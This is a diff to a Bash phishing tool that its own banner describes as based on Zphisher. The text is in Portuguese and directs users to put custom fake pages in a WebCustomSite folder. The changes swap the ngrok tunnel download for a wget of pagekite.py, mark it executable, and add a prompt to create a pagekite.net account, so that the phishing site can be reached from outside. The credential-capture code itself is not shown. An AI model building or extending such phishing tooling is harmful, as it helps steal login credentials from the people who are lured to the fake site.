@@ -17,7 +17,7 @@ printf " \e[33;1m
 |  \            |      |           |         |       |           /  \  
 |   \           |      |           |         |       |          /    \ 
 |    \          |      |           |         |_______|         /      \ \e[0m\n"
-printf " \e[33;1m      |_|           \e[1;97m    Version 1.3      \e[0m\n"
+printf " \e[33;1m      |_|           \e[1;97m    Versão 1.3.2      \e[0m\n"
 printf " \n"
 printf " \e[92m[\e[37;1m+\e[92m]\e[0m\e[33;1m Ferramenta criada por HeroRicky_Games (https://www.youtube.com/herorickygames)
 Baseada na Zphisher \e[0m\n"
@@ -25,7 +25,7 @@ printf "
 
 Essa ferramenta é flex, voce muda os arquvios na pasta WebCustomSite
 lembre-se que pode haver quedas na rede se compartilhada por muitos 
-e lembre=se de trocar o link a cada 7 em 7 horas.
+e faça sua conta no site https://pagekite.net
 
 "
 printf " \n"
@@ -172,11 +172,10 @@ printf " \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m Error \e[1;31m[\e[0m
 exit 1
 fi
 else
-curl -LO https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
-if [[ -e ngrok-stable-linux-386.zip ]]; then
-unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
-chmod +x ngrok
-rm -rf ngrok-stable-linux-386.zip
+wget https://pagekite.net/pk/pagekite.py > /dev/null 2>&1 > /dev/null 2>&1
+if [[ -e pagekite.py ]]; then
+chmod +x pagekite.py
+rm pagekite.py.1
 else
 printf " \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m Error \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;96m Please Install All Packges.\e[0m\n"
 exit 1
